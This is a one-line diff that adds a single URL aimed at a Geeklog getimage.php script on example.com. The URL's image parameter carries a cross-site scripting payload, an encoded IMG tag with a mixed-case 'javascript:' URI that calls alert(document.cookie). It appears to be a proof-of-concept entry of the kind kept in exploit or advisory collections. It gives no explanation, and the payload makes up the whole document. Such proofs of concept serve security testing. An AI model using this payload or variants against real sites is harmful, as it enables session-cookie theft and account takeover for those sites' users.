@@ -1,0 +1,1 @@
+http://www.example.com/geeklog/getimage.php?mode=show&amp;image=./&lt;IMG%20SRC=JaVaScRiPt:alert(document.cookie)&gt;
